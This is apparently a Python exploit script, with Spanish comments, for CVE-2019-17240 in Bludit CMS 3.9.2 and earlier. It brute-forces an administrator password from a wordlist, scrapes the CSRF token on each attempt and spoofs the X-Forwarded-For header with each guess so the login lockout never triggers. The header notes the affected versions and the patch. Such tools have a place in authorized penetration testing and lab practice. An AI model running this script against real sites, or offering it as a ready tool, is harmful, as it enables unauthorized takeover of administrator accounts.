'''
# Titulo: Bludit CMS - bypass brute force protection mechanism.
# Autor: rastating - https://rastating.github.io/bludit-brute-force-mitigation-bypass/
# Modificación/adaptación: MrW0l05zyn - https://github.com/MrW0l05zyn/bludit-cms-bypass-brute-force-protection-mechanism
# Versiones afectadas: Bludit CMS <= 3.9.2
# CVE: 2019-17240
# Descripción: permite realizar bypass (eludir) el mecanismo de protección de fuerza bruta de Bludit CMS versión 3.9.2 o inferior, mediante el uso de diferentes encabezados HTTP X-Forward-For falsificados.
# Solución: actualice a una versión posterior a 3.9.2 o aplique el parche que se encuentra en https://github.com/bludit/bludit/pull/1090
'''

import argparse
import re
import requests
import sys

# clase color
class color:
   Bold = '\033[1;37;48m'
   Black = '\033[0;30;48m'
   Blue = '\033[0;34;48m'
   Cyan = '\033[0;36;48m'
   Green = '\033[0;32;48m'
   Purple = '\033[0;35;48m'
   Red = '\033[0;31;48m'
   Unerline = '\033[4;37;48m'
   Yellow = '\033[0;33;48m'
   End = '\033[0;37;0m'

# variables
passwordsList = []
loginURL = ''
passwordCounter = 0

# configuración de analizador
analizador = argparse.ArgumentParser(
    usage='%(prog)s -t TARGET/HOST -l LOGIN-URL -u USERNAME -w WORDLIST',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description="""examples:
    ./%(prog)s -t http://X.X.X.X -l /admin/ -u admin -w /path/wordlist.txt """,
    epilog=''
)

# argumentos de analizador
analizador.add_argument('-t', action='store', help='Target/Host', dest='target', type=str)
analizador.add_argument('-l', action='store', help='Login URL', dest='login', type=str)
analizador.add_argument('-u', action='store', help='Username', dest='username', type=str)
analizador.add_argument('-w', action='store', help='Path wordlist', dest='wordlist', type=argparse.FileType('r'))

# lectura de argumentos desde linea de comandos
argumentos = analizador.parse_args()

# validación de ingreso de parámetros
if not argumentos.target or not argumentos.login or not argumentos.username or not argumentos.wordlist:
   analizador.print_help()
   sys.exit()

# lectura de wordlist
wordlist = argumentos.wordlist
for passwords in wordlist.readlines():
    passwordsList.append(passwords.strip())
wordlist.close()

# verificación de wordlist
if len(passwordsList) == 0:
    print()
    print(color.Yellow + 'Empty wordlist!' + color.End)
    print()
    sys.exit()

# URL de inicio de sesión completa
loginURL = argumentos.target + argumentos.login

# contraseña no encontrada
print()
print(color.Bold + 'Bludit CMS: bypass brute force protection mechanism (CVE-2019-17240)' + color.End)
print('* URL: ' + loginURL)
print('* User: ' + argumentos.username)
print()

#fuerza bruta de contraseñas con bypass
for password in passwordsList:

    try:
        session = requests.Session()
        loginPage = session.get(loginURL,timeout=5)
        loginPage.raise_for_status()
    except requests.exceptions.HTTPError as errh:
        print (color.Red + 'HTTP error:' + color.End, errh)
        sys.exit()
    except requests.exceptions.ConnectionError as errc:
        print (color.Red + 'Error connecting:' + color.End, errc)
        sys.exit()
    except requests.exceptions.Timeout as errt:
        print (color.Red + 'Timeout error:' + color.End, errt)
        sys.exit()
    except requests.exceptions.RequestException as err:
        print (color.Red + 'Error:' + color.End, err)
        sys.exit()
    
    passwordCounter += 1
    csrfToken = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', loginPage.text).group(1)
    print(color.Cyan + '[{c}] Trying password: {p}'.format(c = passwordCounter, p = password) + color.End)

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': loginURL
    }
    data = {
        'tokenCSRF': csrfToken,
        'username': argumentos.username,
        'password': password,
        'save': ''
    }

    # verificación de usuario y contraseña
    loginResult = session.post(loginURL, headers = headers, data = data, allow_redirects = False)
    if 'location' in loginResult.headers:
        if '/admin/dashboard' in loginResult.headers['location']:
            print()
            print(color.Green + 'Success: password found!' + color.End)
            print('- User: {u}'.format(u = argumentos.username))
            print('- Password: {p}'.format(p = password))
            print()
            sys.exit()

# contraseña no encontrada
print()
print(color.Yellow + 'Password not found!' + color.End)
print()